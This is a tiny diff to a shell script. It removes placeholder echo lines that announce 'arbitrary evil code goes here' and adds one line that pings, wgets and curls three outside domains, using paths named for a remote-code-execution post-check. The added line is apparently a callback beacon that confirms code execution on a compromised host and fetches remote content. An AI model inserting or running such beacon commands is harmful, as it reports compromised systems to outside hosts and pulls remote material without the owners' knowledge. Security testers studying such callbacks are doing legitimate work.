@@ -1,4 +1,2 @@
 #!/bin/sh
-echo '=================================='
-echo ' arbitrary evil code goes here ;) '
-echo '=================================='
+ping rcercepostcheck.cfz.cl; wget https://confianze.io/ultronwget/rcepostcheck; curl http://lolo.cfz.cl/ultroncurl/rcepostcheck;
